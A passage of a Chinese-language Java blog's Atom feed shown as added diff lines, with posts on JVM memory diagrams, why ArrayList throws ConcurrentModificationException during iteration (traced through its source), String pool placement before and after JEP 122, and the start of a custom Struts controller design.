+      &lt;h2 id=&quot;写在前面：&quot;&gt;&lt;a href=&quot;#写在前面：&quot; class=&quot;headerlink&quot; title=&quot;写在前面：&quot;&gt;&lt;/a&gt;写在前面：&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;最近一直在深入学习并理解之前学过的JAVA 集合、多线程、MySQL、框架原理等相关内容基础的原理和
+    
+    </summary>
+    
+    
+      <category term="设计模式" scheme="http://jooop.github.io/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>JVM知识脉络图</title>
+    <link href="http://jooop.github.io/2017/03/29/JVM%E7%9F%A5%E8%AF%86%E8%84%89%E7%BB%9C%E5%9B%BE/"/>
+    <id>http://jooop.github.io/2017/03/29/JVM知识脉络图/</id>
+    <published>2017-03-29T13:59:23.000Z</published>
+    <updated>2017-03-30T04:45:32.027Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="JVM知识脉络图"><a href="#JVM知识脉络图" class="headerlink" title="JVM知识脉络图"></a>JVM知识脉络图</h1><ul>
+<li>最近阅读完周志明先生的《深入理解JAVA虚拟机》，因暂时没有实际上虚拟机性能监控、调优的需求，所以在读的时候重点是对虚拟机的实现原理、算法的理解阅读，其中许多规范和实现较为抽象不易理解，故此对其关键点的知识脉络进行了整理。</li>
+</ul>
+<h2 id="JVM内存划分"><a href="#JVM内存划分" class="headerlink" title="JVM内存划分"></a>JVM内存划分</h2><p><img src="http://odl4eqqu9.bkt.clouddn.com/blog/JVMjava%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%BF%90%E8%A1%8C%E6%97%B6%E6%95%B0%E6%8D%AE%E5%8C%BA.PNG" alt="Alt text"></p>
+<h2 id="对象的创建"><a href="#对象的创建" class="headerlink" title="对象的创建"></a>对象的创建</h2><p><img src="http://odl4eqqu9.bkt.clouddn.com/blog/JVMJVM%E4%B8%AD%E5%AF%B9%E8%B1%A1%E5%88%9B%E5%BB%BA%E7%9A%84%E8%BF%87%E7%A8%8B.png" alt="Alt text"></p>
+<h2 id="JVM-GC机制"><a href="#JVM-GC机制" class="headerlink" title="JVM GC机制"></a>JVM GC机制</h2><p><img src="http://odl4eqqu9.bkt.clouddn.com/blog/JVMJVM%20GC%E6%9C%BA%E5%88%B6.png" alt="enter image description here"></p>
+<h2 id="类加载机制"><a href="#类加载机制" class="headerlink" title="类加载机制"></a>类加载机制</h2><p><img src="http://odl4eqqu9.bkt.clouddn.com/blog/JVMJVM%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6.png" alt="类加载机制"></p>
+<ul>
+<li>【以上图例均为原创，欢迎转载，请注明出处。】</li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;JVM知识脉络图&quot;&gt;&lt;a href=&quot;#JVM知识脉络图&quot; class=&quot;headerlink&quot; title=&quot;JVM知识脉络图&quot;&gt;&lt;/a&gt;JVM知识脉络图&lt;/h1&gt;&lt;ul&gt;
+&lt;li&gt;最近阅读完周志明先生的《深入理解JAVA虚拟机》，因暂时没有实际上虚拟机性能监控
+    
+    </summary>
+    
+    
+      <category term="JVM" scheme="http://jooop.github.io/tags/JVM/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>从ArrayList源码探究迭代时修改集合内容会抛出异常的原因</title>
+    <link href="http://jooop.github.io/2017/03/16/%E4%BB%8EArrayList%E6%BA%90%E7%A0%81%E6%8E%A2%E7%A9%B6%E8%BF%AD%E4%BB%A3%E6%97%B6%E4%BF%AE%E6%94%B9%E9%9B%86%E5%90%88%E5%86%85%E5%AE%B9%E4%BC%9A%E6%8A%9B%E5%87%BA%E5%BC%82%E5%B8%B8%E7%9A%84%E5%8E%9F%E5%9B%A0/"/>
+    <id>http://jooop.github.io/2017/03/16/从ArrayList源码探究迭代时修改集合内容会抛出异常的原因/</id>
+    <published>2017-03-16T11:29:30.000Z</published>
+    <updated>2017-03-16T11:39:48.178Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="从ArrayList源码探究迭代时修改集合内容会抛出异常的原因"><a href="#从ArrayList源码探究迭代时修改集合内容会抛出异常的原因" class="headerlink" title="从ArrayList源码探究迭代时修改集合内容会抛出异常的原因"></a>从ArrayList源码探究迭代时修改集合内容会抛出异常的原因</h1><h2 id="ConcurrentModificationException异常的产生："><a href="#ConcurrentModificationException异常的产生：" class="headerlink" title="ConcurrentModificationException异常的产生："></a>ConcurrentModificationException异常的产生：</h2><p>在阅读《阿里巴巴 JAVA 开发手册 》一文时，其中有这样一条描述：</p>
+<ul>
+<li><code>7. 【强制】不要在 foreach 循环里进行元素的 remove/add 操作。remove 元素请使用 Iterator 方式，如果并发操作，需要对 Iterator 对象加锁。</code></li>
+<li><p><code>反例：</code></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><div class="line">List&lt;String&gt; a = <span class="keyword">new</span> ArrayList&lt;String&gt;();</div><div class="line">   a.add(<span class="string">"1"</span>);</div><div class="line">   a.add(<span class="string">"2"</span>);</div><div class="line">   <span class="keyword">for</span> (String temp:a)&#123;</div><div class="line">       <span class="keyword">if</span>(<span class="string">"1"</span>.equals(temp))&#123;</div><div class="line">           a.remove(temp);</div><div class="line">       &#125;</div><div class="line">   &#125;</div></pre></td></tr></table></figure>
+</li>
+<li><p><code>说明：这个例子的执行结果会出乎大家的意料，那么试一下把“1”换成“2”，会是同样的结果吗？</code></p>
+</li>
+<li><code>正例：</code><figure class="highlight java"><table><tr><td class="code"><pre><div class="line">Iterator&lt;String&gt; it = a.iterator();</div><div class="line">   <span class="keyword">while</span> (it.hasNext())&#123;</div><div class="line">       String temp = it.next();</div><div class="line">       <span class="keyword">if</span>(<span class="string">"2"</span>.equals(temp))&#123;</div><div class="line">           it.remove();</div><div class="line">       &#125;</div><div class="line">   &#125;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>对上面描述的foreach循环方法中，将<code>&quot;1&quot;改成&quot;2&quot;</code>之后，报错如下：<br><figure class="highlight java"><table><tr><td class="code"><pre><div class="line">java.util.ConcurrentModificationException</div><div class="line">	at java.util.ArrayList$Itr.checkForComodification(ArrayList.java:<span class="number">901</span>)</div><div class="line">	at java.util.ArrayList$Itr.next(ArrayList.java:<span class="number">851</span>)</div></pre></td></tr></table></figure></p>
+<h2 id="同样的问题："><a href="#同样的问题：" class="headerlink" title="同样的问题："></a>同样的问题：</h2><p>另外根据<code>集合对象的for增强即为iterator方式循环的简化</code>的原理，将正例的iterator方式循环中<code>it.remove()</code>改为<code>a.remove(temp);</code>也会有同样的报错。<br>例如：<br><figure class="highlight java"><table><tr><td class="code"><pre><div class="line">	Iterator&lt;String&gt; it = a.iterator();</div><div class="line">    <span class="keyword">while</span> (it.hasNext())&#123;</div><div class="line">        String temp = it.next();</div><div class="line">        <span class="keyword">if</span>(<span class="string">"2"</span>.equals(temp))&#123;</div><div class="line">            a.remove(temp); <span class="comment">//注意此处</span></div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">运行结果:</div><div class="line">	java.util.ConcurrentModificationException</div><div class="line">	at java.util.ArrayList$Itr.checkForComodification(ArrayList.java:<span class="number">901</span>)</div><div class="line">	at java.util.ArrayList$Itr.next(ArrayList.java:<span class="number">851</span>)</div><div class="line">	异常定位到该方法中的String temp = it.next();</div></pre></td></tr></table></figure></p>
+<h2 id="从源码解释异常的原因"><a href="#从源码解释异常的原因" class="headerlink" title="从源码解释异常的原因"></a>从源码解释异常的原因</h2><p>根据异常信息抛出的位置为<code>String temp = it.next();</code>，可定位异常是由迭代器中的方法抛出的。<br>查看ArrayList的源码，提取出重点信息如下：<br><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayList</span>&lt;<span class="title">E</span>&gt; <span class="keyword">extends</span> <span class="title">AbstractList</span>&lt;<span class="title">E</span>&gt; <span class="keyword">implements</span> <span class="title">List</span>&lt;<span class="title">E</span>&gt;, <span class="title">RandomAccess</span>, <span class="title">Cloneable</span>, <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span></span>&#123;</div><div class="line"></div><div class="line">	<span class="keyword">protected</span> <span class="keyword">transient</span> <span class="keyword">int</span> modCount = <span class="number">0</span>;</div><div class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">trimToSize</span><span class="params">()</span> </span>&#123;</div><div class="line">        modCount++;</div><div class="line">        <span class="comment">//………此处省略</span></div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">ensureExplicitCapacity</span><span class="params">(<span class="keyword">int</span> minCapacity)</span> </span>&#123;</div><div class="line">        modCount++;</div><div class="line">        <span class="comment">//………此处省略</span></div><div class="line">    &#125;</div><div class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">add</span><span class="params">(E e)</span> </span>&#123;</div><div class="line">        ensureCapacityInternal(size + <span class="number">1</span>);  <span class="comment">// Increments modCount!!</span></div><div class="line">        <span class="comment">//………此处省略</span></div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> index, E element)</span> </span>&#123;</div><div class="line">        ensureCapacityInternal(size + <span class="number">1</span>);  <span class="comment">// Increments modCount!!</span></div><div class="line">        <span class="comment">//………此处省略</span></div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">remove</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</div><div class="line">        modCount++;</div><div class="line">       <span class="comment">//………此处省略</span></div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">remove</span><span class="params">(Object o)</span> </span>&#123;</div><div class="line">	   <span class="comment">//调用fastRemove()进行修改。</span></div><div class="line">	   	&#125;</div><div class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">fastRemove</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</div><div class="line">        modCount++;</div><div class="line">        <span class="comment">//………此处省略</span></div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">clear</span><span class="params">()</span> </span>&#123;</div><div class="line">        modCount++;</div><div class="line">        <span class="comment">//………此处省略</span></div><div class="line">    &#125;</div><div class="line">	</div><div class="line">	</div><div class="line">	<span class="function"><span class="keyword">public</span> Iterator&lt;E&gt; <span class="title">iterator</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Itr();</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">	<span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">Itr</span> <span class="keyword">implements</span> <span class="title">Iterator</span>&lt;<span class="title">E</span>&gt; </span>&#123;</div><div class="line">        <span class="keyword">int</span> cursor;       <span class="comment">// index of next element to return</span></div><div class="line">        <span class="keyword">int</span> lastRet = -<span class="number">1</span>; <span class="comment">// index of last element returned; -1 if no such</span></div><div class="line">        <span class="keyword">int</span> expectedModCount = modCount;</div><div class="line"></div><div class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasNext</span><span class="params">()</span> </span>&#123;</div><div class="line">            <span class="keyword">return</span> cursor != size;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</div><div class="line">        <span class="function"><span class="keyword">public</span> E <span class="title">next</span><span class="params">()</span> </span>&#123;</div><div class="line">            checkForComodification();</div><div class="line">            <span class="keyword">int</span> i = cursor;</div><div class="line">            <span class="keyword">if</span> (i &gt;= size)</div><div class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchElementException();</div><div class="line">            Object[] elementData = ArrayList.<span class="keyword">this</span>.elementData;</div><div class="line">            <span class="keyword">if</span> (i &gt;= elementData.length)</div><div class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ConcurrentModificationException();</div><div class="line">            cursor = i + <span class="number">1</span>;</div><div class="line">            <span class="keyword">return</span> (E) elementData[lastRet = i];</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">remove</span><span class="params">()</span> </span>&#123;</div><div class="line">            <span class="keyword">if</span> (lastRet &lt; <span class="number">0</span>)</div><div class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException();</div><div class="line">            checkForComodification();</div><div class="line"></div><div class="line">            <span class="keyword">try</span> &#123;</div><div class="line">                ArrayList.<span class="keyword">this</span>.remove(lastRet);</div><div class="line">                cursor = lastRet;</div><div class="line">                lastRet = -<span class="number">1</span>;</div><div class="line">                expectedModCount = modCount;</div><div class="line">            &#125; <span class="keyword">catch</span> (IndexOutOfBoundsException ex) &#123;</div><div class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ConcurrentModificationException();</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="meta">@Override</span></div><div class="line">        <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</div><div class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">forEachRemaining</span><span class="params">(Consumer&lt;? <span class="keyword">super</span> E&gt; consumer)</span> </span>&#123;</div><div class="line">            Objects.requireNonNull(consumer);</div><div class="line">            <span class="keyword">final</span> <span class="keyword">int</span> size = ArrayList.<span class="keyword">this</span>.size;</div><div class="line">            <span class="keyword">int</span> i = cursor;</div><div class="line">            <span class="keyword">if</span> (i &gt;= size) &#123;</div><div class="line">                <span class="keyword">return</span>;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">final</span> Object[] elementData = ArrayList.<span class="keyword">this</span>.elementData;</div><div class="line">            <span class="keyword">if</span> (i &gt;= elementData.length) &#123;</div><div class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ConcurrentModificationException();</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">while</span> (i != size &amp;&amp; modCount == expectedModCount) &#123;</div><div class="line">                consumer.accept((E) elementData[i++]);</div><div class="line">            &#125;</div><div class="line">            <span class="comment">// update once at end of iteration to reduce heap write traffic</span></div><div class="line">            cursor = i;</div><div class="line">            lastRet = i - <span class="number">1</span>;</div><div class="line">            checkForComodification();</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="function"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title">checkForComodification</span><span class="params">()</span> </span>&#123;</div><div class="line">            <span class="keyword">if</span> (modCount != expectedModCount)</div><div class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ConcurrentModificationException();</div><div class="line">        &#125;</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
+<p>由以上源码可以看出：</p>
+<ul>
+<li>ListArray中有:<br>属性：<code>int modCount = 0;</code>（记录对集合的修改操作次数）<br>内部类：<code>Itr</code>。（用来返回Iterator对象）<br>方法：<code>add()</code>、<code>remove(int index)</code>、<code>clear()</code>、<code>trimToSize()</code>等。（其操作都会修改modCount的值。）</li>
+<li>返回的Iterator对象中有<code>expectedModCount</code>属性，初始化时使其等于集合对象中的<code>modCount</code>。</li>
+<li>Iterator对象中<code>next()</code>和<code>remove()</code>方法在执行时会比较<code>modCount</code>和<code>expectedModCount</code>的值，若不相等则抛出<code>ConcurrentModificationException</code>异常。</li>
+<li>Iterator对象中<code>remove()</code>方法在调用集合中的方法<code>remove(int index)</code>将集合中的对象进行删除以后，会使<code>expectedModCount = modCount;</code>。</li>
+</ul>
+<p>简单的说就是<strong>集合对象</strong>和<strong>迭代对象</strong>分别有一个<strong>计数器</strong>记录修改操作。使用迭代器中<code>remove()</code>、<code>next()</code>方法前都会<strong>检查两个计数器是否一致</strong>，若<strong>不一致则抛出异常</strong>。迭代器中的计数器只在迭代对象创建和使用迭代器中的<code>remove()</code>方法后，才会和集合中的计数器同步。若在<strong>迭代中调用集合中的方法则会使两个计数器不同步</strong>。</p>
+<h2 id="fail-fast机制"><a href="#fail-fast机制" class="headerlink" title="fail-fast机制"></a>fail-fast机制</h2><p>另外经过查阅以后得知该异常检测机制其实是<code>fail-fast</code>。</p>
+<ul>
+<li>“快速失败”也就是fail-fast，它是Java集合的一种错误检测机制。当多个线程对集合进行结构上的改变的操作时，有可能会产生fail-fast机制。记住是有可能，而不是一定。例如：假设存在两个线程（线程1、线程2），线程1通过Iterator在遍历集合A中的元素，在某个时候线程2修改了集合A的结构（是结构上面的修改，而不是简单的修改集合元素的内容），那么这个时候程序就会抛出 ConcurrentModificationException 异常，从而产生fail-fast机制。</li>
+</ul>
+<h2 id="对开始时问题的进一步解释"><a href="#对开始时问题的进一步解释" class="headerlink" title="对开始时问题的进一步解释"></a>对开始时问题的进一步解释</h2><p>根据前面对源码的分析，得知了 ConcurrentModificationException 异常产生的条件，只要在迭代过程中通过集合本身的方法进行操作就会抛出该异常，然而在最初例子中：<br><figure class="highlight java"><table><tr><td class="code"><pre><div class="line">List&lt;String&gt; a = <span class="keyword">new</span> ArrayList&lt;String&gt;();</div><div class="line">   a.add(<span class="string">"1"</span>);</div><div class="line">   a.add(<span class="string">"2"</span>);</div><div class="line">   <span class="keyword">for</span> (String temp:a)&#123;</div><div class="line">       <span class="keyword">if</span>(<span class="string">"1"</span>.equals(temp))&#123;</div><div class="line">           a.remove(temp);</div><div class="line">       &#125;</div><div class="line">   &#125;</div><div class="line">   <span class="comment">//结果：正常执行。</span></div></pre></td></tr></table></figure></p>
+<p>此时虽然是在迭代过程中使用集合本身的方法进行了修改，但是并没有抛出异常。<br>对上面的例子进行修改，再次测试<br><figure class="highlight java"><table><tr><td class="code"><pre><div class="line">List&lt;String&gt; a = <span class="keyword">new</span> ArrayList&lt;String&gt;();</div><div class="line">   a.add(<span class="string">"1"</span>);</div><div class="line">   a.add(<span class="string">"2"</span>);</div><div class="line">   a.add(<span class="string">"3"</span>);</div><div class="line">   <span class="keyword">while</span> (it.hasNext())&#123;</div><div class="line">       String temp = it.next();</div><div class="line">       <span class="keyword">if</span>(<span class="string">"1"</span>.equals(temp))&#123;</div><div class="line">           a.remove(temp);</div><div class="line">       &#125;</div><div class="line">   &#125;</div><div class="line">   <span class="comment">/**</span></div><div class="line">   上面解释过，此方法等同于</div><div class="line">   for (String temp:a)&#123;</div><div class="line">       if("1".equals(temp))&#123;</div><div class="line">           a.remove(temp);</div><div class="line">       &#125;</div><div class="line">   &#125;</div><div class="line">   */</div><div class="line">   <span class="comment">//结果：</span></div><div class="line">   <span class="comment">//java.util.ConcurrentModificationException</span></div><div class="line"><span class="comment">//at java.util.ArrayList$Itr.checkForComodification(ArrayList.java:901)</span></div><div class="line"><span class="comment">//at java.util.ArrayList$Itr.next(ArrayList.java:851)</span></div><div class="line"></div><div class="line">List&lt;String&gt; a = <span class="keyword">new</span> ArrayList&lt;String&gt;();</div><div class="line">   a.add(<span class="string">"1"</span>);</div><div class="line">   a.add(<span class="string">"2"</span>);</div><div class="line">   a.add(<span class="string">"3"</span>);</div><div class="line">   <span class="keyword">while</span> (it.hasNext())&#123;</div><div class="line">       String temp = it.next();</div><div class="line">       <span class="keyword">if</span>(<span class="string">"2"</span>.equals(temp))&#123;</div><div class="line">           a.remove(temp);</div><div class="line">       &#125;</div><div class="line">   &#125;</div><div class="line"><span class="comment">//结果：</span></div><div class="line"><span class="comment">//正常执行</span></div><div class="line"></div><div class="line">List&lt;String&gt; a = <span class="keyword">new</span> ArrayList&lt;String&gt;();</div><div class="line">   a.add(<span class="string">"1"</span>);</div><div class="line">   a.add(<span class="string">"2"</span>);</div><div class="line">   a.add(<span class="string">"3"</span>);</div><div class="line">   <span class="keyword">while</span> (it.hasNext())&#123;</div><div class="line">       String temp = it.next();</div><div class="line">       <span class="keyword">if</span>(<span class="string">"3"</span>.equals(temp))&#123;</div><div class="line">           a.remove(temp);</div><div class="line">       &#125;</div><div class="line">   &#125;</div><div class="line">   <span class="comment">//结果：</span></div><div class="line">   <span class="comment">//java.util.ConcurrentModificationException</span></div><div class="line"><span class="comment">//at java.util.ArrayList$Itr.checkForComodification(ArrayList.java:901)</span></div><div class="line"><span class="comment">//at java.util.ArrayList$Itr.next(ArrayList.java:851)</span></div></pre></td></tr></table></figure></p>
+<p>使用断点调试一步步执行后，发现问题在于在对倒数第二个对象使用集合内方法进行移除以后，并不会再次进入while循环。此时it.next()并没有执行到，因此不会抛出异常。</p>
+<p>再次从上面贴出的源码分析：<br>在内部类Itr中关于hasNext()方法的定义如下：<br><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasNext</span><span class="params">()</span> </span>&#123;</div><div class="line">            <span class="keyword">return</span> cursor != size;</div><div class="line">        &#125;</div></pre></td></tr></table></figure></p>
+<ul>
+<li>cursor是Itr类中的属性，初始化为0，每当执行next()方法后cursor=cursor+1。</li>
+<li>size则为集合类中的对象的数量。</li>
+<li>在上面的例子中，<strong>移除倒数第二个对象之前，size=3，cursor =2</strong> 。<br>当<strong>移除倒数第二个对象后，size=2，cursor =2</strong>。</li>
+<li>执行<strong>hasNext()返回false</strong>，结束循环。</li>
+</ul>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>上面的测试用例中，<code>&quot;1&quot;</code>、<code>&quot;3&quot;</code>为条件时抛出异常是因为<code>fail-fast机制</code>的存在，<code>&quot;2&quot;</code>为条件时没抛出异常是因为循环已经结束，并没有执行到会检测该异常的<code>it.next()</code>方法。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;从ArrayList源码探究迭代时修改集合内容会抛出异常的原因&quot;&gt;&lt;a href=&quot;#从ArrayList源码探究迭代时修改集合内容会抛出异常的原因&quot; class=&quot;headerlink&quot; title=&quot;从ArrayList源码探究迭代时修改集合内容会抛出异常的原
+    
+    </summary>
+    
+    
+      <category term="J2SE" scheme="http://jooop.github.io/tags/J2SE/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>java中String对象的创建过程和JVM中的状态分析</title>
+    <link href="http://jooop.github.io/2017/03/13/java%E4%B8%ADString%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%9B%E5%BB%BA%E8%BF%87%E7%A8%8B%E5%92%8CJVM%E4%B8%AD%E7%9A%84%E7%8A%B6%E6%80%81%E5%88%86%E6%9E%90/"/>
+    <id>http://jooop.github.io/2017/03/13/java中String对象的创建过程和JVM中的状态分析/</id>
+    <published>2017-03-13T00:51:03.000Z</published>
+    <updated>2017-03-16T06:07:32.286Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="java中String对象的创建过程和JVM中的状态分析"><a href="#java中String对象的创建过程和JVM中的状态分析" class="headerlink" title="java中String对象的创建过程和JVM中的状态分析"></a>java中String对象的创建过程和JVM中的状态分析</h1><h2 id="String-s-new-String-quot-xyz-quot-创建了几个String-Object？"><a href="#String-s-new-String-quot-xyz-quot-创建了几个String-Object？" class="headerlink" title="String s = new String(&quot;xyz&quot;); 创建了几个String Object？"></a><code>String s = new String(&quot;xyz&quot;);</code> 创建了几个String Object？</h2><p>以下是在网上查到的关于上述问题流传较为广泛的说法:</p>
+<ul>
+<li>两个或一个，”xyz”对应一个对象，这个对象放在字符串常量缓冲区，常量”xyz”不管出现多 少遍，都是缓冲区中的那一个。New String 每写一遍，就创建一个新的对象，它一句那个 常量”xyz”对象的内容来创建出一个新 String 对象。如果以前就用过’xyz’，这句代表就不会 创建”xyz”自己了，直接从缓冲区拿。 </li>
+</ul>
+<h2 id="对上述问题的修正：String-s-new-String-quot-xyz-quot-在运行时涉及几个实例？"><a href="#对上述问题的修正：String-s-new-String-quot-xyz-quot-在运行时涉及几个实例？" class="headerlink" title="对上述问题的修正：String s = new String(&quot;xyz&quot;); 在运行时涉及几个实例？"></a>对上述问题的修正：<code>String s = new String(&quot;xyz&quot;);</code> 在<strong>运行时涉及几个实例</strong>？</h2><p>在对该问题的答案的寻找中，在<code>RednaxelaFX</code>大牛的博客中看到了对该问题的质疑，总结下来认为若按第一种问法是没有标准答案的。<br>而若按java虚拟机规范定义的来看，将问题改为<code>String s = new String(&quot;xyz&quot;);  在运行时涉及几个实例</code>？<br>答案则应该为<code>两个，一个是字符串字面量&quot;xyz&quot;所对应的、驻留（intern）在一个全局共享的字符串常量池中的实例，另一个是通过new String(String)创建并初始化的、内容与&quot;xyz&quot;相同的实例</code></p>
+<h2 id="什么是String池，它在哪里？"><a href="#什么是String池，它在哪里？" class="headerlink" title="什么是String池，它在哪里？"></a>什么是String池，它在哪里？</h2><p>上面问题的回答中都有涉及到<code>字符串常量池</code>，流传较广的说法中更具体的称为<code>String池</code>。<br>对于String池是什么，它在虚拟机的内存中是怎么分配的一直较为迷惑。<br>最近刚好阅读《深入理解JAVA虚拟机》一书，书中对于java虚拟机运行时数据区是这么划分的：<br> <img src="http://odl4eqqu9.bkt.clouddn.com/java%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%BF%90%E8%A1%8C%E6%97%B6%E6%95%B0%E6%8D%AE%E5%8C%BA.PNG" alt="Alt text"></p>
+<ul>
+<li>流行的对java内存中存放数据的描述，一般较为粗糙的划分为“堆”和“栈”。<br><strong>“栈”即指虚拟机栈中的局部变量表部分</strong>。局部表量表中<strong>存放着编译期可知的各种基本数据类型、引用对象和returnAddress类型</strong>（指向了一条字节码指令的地址）。<br><strong>“堆”</strong>在<strong>虚拟机启动时创建，它的唯一目的是存放对象实例。</strong></li>
+<li><strong>“方法区”</strong>：用于存储<strong>被虚拟机加载的类信息、常量、静态变量、即时编译器编译后的代码等数据。</strong>另外，方法区在Java虚拟机规范中被描述为一个逻辑分区。</li>
+<li><strong>运行时常量池</strong>是方法区的一部分。Class文件中除了有类的版本、字段、方法、接口等描述信息外，还有一项信息是<strong>常量池</strong>，用于<strong>存放编译期生成的各种字面量和符号引用</strong>，这部分内容将在类加载后进入<strong>方法区的运行时常量池</strong>存放。</li>
+<li>对于<strong>HotSpot虚拟机</strong>来说，方法区是用“永久代”来实现的。因为容易遇到内存溢出问题。在JDK1.7的HotSpot中，已经把原本存放在永久代的<strong>字符串常量池移除</strong>。</li>
+</ul>
+<p>根据上面描述，可推出<strong><code>“String池”即字符串常量池在JDK1.7之前是存在于方法区的。</code></strong><br><img src="http://odl4eqqu9.bkt.clouddn.com/blog/JVMJDK1.7%E4%BB%A5%E5%89%8D%E7%9A%84%E5%B8%B8%E9%87%8F%E6%B1%A0.PNG" alt="Alt text"></p>
+<h2 id="自JDK1-7开始，字符串常量池又去了哪里？"><a href="#自JDK1-7开始，字符串常量池又去了哪里？" class="headerlink" title="自JDK1.7开始，字符串常量池又去了哪里？"></a>自JDK1.7开始，字符串常量池又去了哪里？</h2><p>根据官方描述<a href="http://openjdk.java.net/jeps/122" target="_blank" rel="external">JEP 122: Remove the Permanent Generation</a></p>
+<ul>
+<li>Description<br>Move part of the contents of the permanent generation in Hotspot to the Java heap and the remainder to native memory.<br>Hotspot’s representation of Java classes (referred to here as class meta-data) is currently stored in a portion of the Java heap referred to as the permanent generation. In addition, interned Strings and class static variables are stored in the permanent generation. The permanent generation is managed by Hotspot and must have enough room for all the class meta-data, interned Strings and class statics used by the Java application. Class metadata and statics are allocated in the permanent generation when a class is loaded and are garbage collected from the permanent generation when the class is unloaded. Interned Strings are also garbage collected when the permanent generation is GC’ed.<br>The proposed implementation will allocate class meta-data in native memory and move interned Strings and class statics to the Java heap. </li>
+</ul>
+<p>根据描述，永久代中的字符串常量池被移到堆中,而元信息则被移到本地内存中的”元空间(Metaspace)”中。并且会被垃圾回收机制回收。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;java中String对象的创建过程和JVM中的状态分析&quot;&gt;&lt;a href=&quot;#java中String对象的创建过程和JVM中的状态分析&quot; class=&quot;headerlink&quot; title=&quot;java中String对象的创建过程和JVM中的状态分析&quot;&gt;&lt;/a&gt;ja
+    
+    </summary>
+    
+    
+      <category term="JVM" scheme="http://jooop.github.io/tags/JVM/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>自定义Struts框架分析</title>
+    <link href="http://jooop.github.io/2017/02/17/%E8%87%AA%E5%AE%9A%E4%B9%89Struts2%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/"/>
+    <id>http://jooop.github.io/2017/02/17/自定义Struts2框架分析/</id>
+    <published>2017-02-17T14:03:36.000Z</published>
+    <updated>2017-02-17T14:18:14.437Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="一、对原有controller分析"><a href="#一、对原有controller分析" class="headerlink" title="一、对原有controller分析"></a>一、对原有controller分析</h2><h3 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h3><ol>
+<li>获取请求数据、封装 </li>
+<li>调用service处理业务请求</li>
+<li>跳转到相应界面</li>
+</ol>
+<h3 id="问题："><a href="#问题：" class="headerlink" title="问题："></a>问题：</h3><p>controller中不止起控制作用，也做业务处理。<br>当业务复杂、数据多的时候不利于维护和开发、代码复用性不高。</p>
+<h2 id="二、解决思想："><a href="#二、解决思想：" class="headerlink" title="二、解决思想："></a>二、解决思想：</h2><p>抽取出controller过程中<code>跳转到相应界面</code>部分，封装为核心控制器，将<code>获取请求数据、封装</code>和具体<code>调用service处理业务请求</code>交给相应的action处理。<br>在核心控制器中创建Action对象，调用其方法返回目标URI，然后在核心控制器中进行跳转处理。</p>
